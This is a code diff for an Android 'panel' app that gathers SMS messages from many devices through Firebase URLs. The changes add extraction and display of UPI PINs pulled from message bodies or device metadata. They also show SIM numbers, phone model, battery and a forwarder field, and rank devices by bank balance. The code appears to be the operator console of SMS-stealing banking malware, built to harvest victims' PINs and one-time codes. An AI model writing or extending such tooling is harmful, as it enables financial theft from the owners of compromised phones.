@@ -7,12 +7,14 @@ import android.net.Uri
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.firebasepanel.sms.domain.ConnectionFilter
+import com.firebasepanel.sms.domain.DeviceSnapshot
 import com.firebasepanel.sms.domain.FetchResult
 import com.firebasepanel.sms.domain.FilterConfig
 import com.firebasepanel.sms.domain.InboxMode
 import com.firebasepanel.sms.domain.PinFilter
 import com.firebasepanel.sms.domain.RawSms
 import com.firebasepanel.sms.domain.SortMode
+import com.firebasepanel.sms.domain.extractUpiPinDigitsFromSmsBodies
 import com.firebasepanel.sms.domain.extractFirebaseUrls
 import com.firebasepanel.sms.domain.fetchManyParallel
 import com.firebasepanel.sms.domain.mainBalanceForSort
@@ -35,6 +37,15 @@ data class DeviceRow(
     val deviceId: String,
     val online: Boolean,
     val deviceHasPin: Boolean,
+    /** Shown like reference UI; from Firebase meta and/or SMS extraction */
+    val upiPinDisplay: String,
+    val modelDisplay: String,
+    val batteryPercent: Int?,
+    val sim1Display: String?,
+    val sim2Display: String?,
+    val lastSeenMillis: Long?,
+    val registeredAtMillis: Long?,
+    val forwarderDisplay: String?,
     val maxBalance: Double,
     val smsCount: Int,
     val lastActivityMillis: Long,
@@ -46,6 +57,14 @@ data class DeviceDetail(
     val deviceId: String,
     val online: Boolean,
     val deviceHasPin: Boolean,
+    val upiPinDisplay: String,
+    val modelDisplay: String,
+    val batteryPercent: Int?,
+    val sim1Display: String?,
+    val sim2Display: String?,
+    val lastSeenMillis: Long?,
+    val registeredAtMillis: Long?,
+    val forwarderDisplay: String?,
     val messages: List<SmsRow>,
 )
 
@@ -88,6 +107,7 @@ data class UiState(
             connection = ConnectionFilter.ONLINE,
             days = null,
             inboxMode = InboxMode.BANK_ALL,
+            sortByBattery = false,
         ),
 )
 
@@ -197,7 +217,7 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                 list.forEachIndexed { i, d ->
                     val pin = if (d.deviceHasPin) "PIN" else "—"
                     appendLine(
-                        "${i + 1}. ${d.deviceId}  |  ${if (d.online) "ON" else "OFF"}  |  $pin  |  max ₹${d.maxBalance.toLong()}  |  ${d.smsCount} SMS",
+                        "${i + 1}. ${d.modelDisplay}  |  ${d.deviceId}  |  ${if (d.online) "ON" else "OFF"}  |  UPI PIN ${d.upiPinDisplay}  |  ${d.batteryPercent ?: "—"}%  |  max ₹${d.maxBalance.toLong()}  |  ${d.smsCount} SMS",
                     )
                     appendLine("   ${d.firebaseUrl}")
                     appendLine()
@@ -236,6 +256,22 @@ private fun deviceIdFromPath(path: String): String {
 
 private fun deviceHasPinMessages(messages: List<RawSms>): Boolean = messages.any { messageHasPinText(it.body) }
 
+private fun resolveUpiPin(msgs: List<RawSms>, snap: DeviceSnapshot?): String {
+    val fromMeta = snap?.metadataUpiPin?.trim()
+    if (!fromMeta.isNullOrEmpty() && !fromMeta.equals("N/A", true)) return fromMeta
+    val fromSms = extractUpiPinDigitsFromSmsBodies(msgs.map { it.body })
+    return fromSms ?: "N/A"
+}
+
+private fun deviceHasPinResolved(
+    msgs: List<RawSms>,
+    snap: DeviceSnapshot?,
+): Boolean {
+    if (deviceHasPinMessages(msgs)) return true
+    val pin = resolveUpiPin(msgs, snap)
+    return pin != "N/A"
+}
+
 private fun pinOkForDevice(deviceHasPin: Boolean, filter: PinFilter, inbox: InboxMode): Boolean {
     if (inbox == InboxMode.OTP_AND_ALERTS || inbox == InboxMode.FULL_INBOX) return true
     return when (filter) {
@@ -272,11 +308,17 @@ private fun matchesSearch(
     devId: String,
     firebaseUrl: String,
     msgs: List<RawSms>,
+    snap: DeviceSnapshot?,
     query: String,
 ): Boolean {
     if (query.isEmpty()) return true
     if (devId.lowercase().contains(query)) return true
     if (firebaseUrl.lowercase().contains(query)) return true
+    val model = snap?.model?.lowercase() ?: ""
+    if (model.contains(query)) return true
+    val s1 = snap?.sim1?.lowercase() ?: ""
+    val s2 = snap?.sim2?.lowercase() ?: ""
+    if (s1.contains(query) || s2.contains(query)) return true
     return msgs.any { sms ->
         sms.sender.lowercase().contains(query) || sms.body.lowercase().contains(query)
     }
@@ -293,9 +335,10 @@ private fun buildDeviceList(
         if (!connectionOk(fr.online, cfg.connection)) continue
         val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
         for ((devId, msgs) in byDev) {
-            val devicePin = deviceHasPinMessages(msgs)
+            val snap = fr.devices[devId]
+            val devicePin = deviceHasPinResolved(msgs, snap)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
-            if (!matchesSearch(devId, fr.url, msgs, q)) continue
+            if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
             val filtered = filterSmsList(msgs, cfg)
             if (filtered.isEmpty()) continue
             val balances = filtered.mapNotNull { mainBalanceForSort(it.body) }
@@ -303,12 +346,26 @@ private fun buildDeviceList(
             val times = filtered.mapNotNull { it.messageAtMillis }
             val lastAct = times.maxOrNull() ?: 0L
             val preview = filtered.maxByOrNull { it.messageAtMillis ?: 0L }?.sender?.ifBlank { "(sender)" } ?: ""
+            val upiPin = resolveUpiPin(msgs, snap)
+            val model =
+                snap?.model?.takeIf { it.isNotBlank() }
+                    ?: devId
+            val batt = snap?.batteryPercent
+            val lastSeen = listOfNotNull(snap?.lastSeenMillis, lastAct).maxOrNull()
             rows.add(
                 DeviceRow(
                     firebaseUrl = fr.url,
                     deviceId = devId,
                     online = fr.online,
                     deviceHasPin = devicePin,
+                    upiPinDisplay = upiPin,
+                    modelDisplay = model,
+                    batteryPercent = batt,
+                    sim1Display = snap?.sim1?.takeIf { it.isNotBlank() },
+                    sim2Display = snap?.sim2?.takeIf { it.isNotBlank() },
+                    lastSeenMillis = lastSeen,
+                    registeredAtMillis = snap?.registeredAtMillis,
+                    forwarderDisplay = snap?.forwarder?.takeIf { it.isNotBlank() },
                     maxBalance = maxBal,
                     smsCount = filtered.size,
                     lastActivityMillis = lastAct,
@@ -319,6 +376,11 @@ private fun buildDeviceList(
     }
     val bankSort = cfg.inboxMode == InboxMode.BANK_FILTERED || cfg.inboxMode == InboxMode.BANK_ALL
     return when {
+        bankSort && cfg.sortByBattery ->
+            when (cfg.sortMode) {
+                SortMode.HIGH_TO_LOW -> rows.sortedByDescending { it.batteryPercent ?: -1 }
+                SortMode.LOW_TO_HIGH -> rows.sortedBy { it.batteryPercent ?: 101 }
+            }
         bankSort ->
             when (cfg.sortMode) {
                 SortMode.HIGH_TO_LOW -> rows.sortedByDescending { it.maxBalance }
@@ -342,9 +404,10 @@ private fun buildLiveFeedList(
         if (!connectionOk(fr.online, cfg.connection)) continue
         val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
         for ((devId, msgs) in byDev) {
-            val devicePin = deviceHasPinMessages(msgs)
+            val snap = fr.devices[devId]
+            val devicePin = deviceHasPinResolved(msgs, snap)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
-            if (!matchesSearch(devId, fr.url, msgs, q)) continue
+            if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
             val filtered = filterSmsList(msgs, cfg)
             for (sms in filtered) {
                 out.add(
@@ -370,7 +433,8 @@ private fun buildLiveFeedList(
 private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: FilterConfig): DeviceDetail? {
     val fr = results.find { it.url == row.firebaseUrl } ?: return null
     val msgs = fr.sms.filter { deviceIdFromPath(it.rawPath) == row.deviceId }
-    val devicePin = deviceHasPinMessages(msgs)
+    val snap = fr.devices[row.deviceId]
+    val devicePin = deviceHasPinResolved(msgs, snap)
     val filtered = filterSmsList(msgs, cfg)
     val smsRows =
         filtered.map { s ->
@@ -397,6 +461,14 @@ private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: F
         deviceId = row.deviceId,
         online = fr.online,
         deviceHasPin = devicePin,
+        upiPinDisplay = resolveUpiPin(msgs, snap),
+        modelDisplay = row.modelDisplay,
+        batteryPercent = row.batteryPercent,
+        sim1Display = row.sim1Display,
+        sim2Display = row.sim2Display,
+        lastSeenMillis = row.lastSeenMillis,
+        registeredAtMillis = row.registeredAtMillis,
+        forwarderDisplay = row.forwarderDisplay,
         messages = ordered,
     )
 }
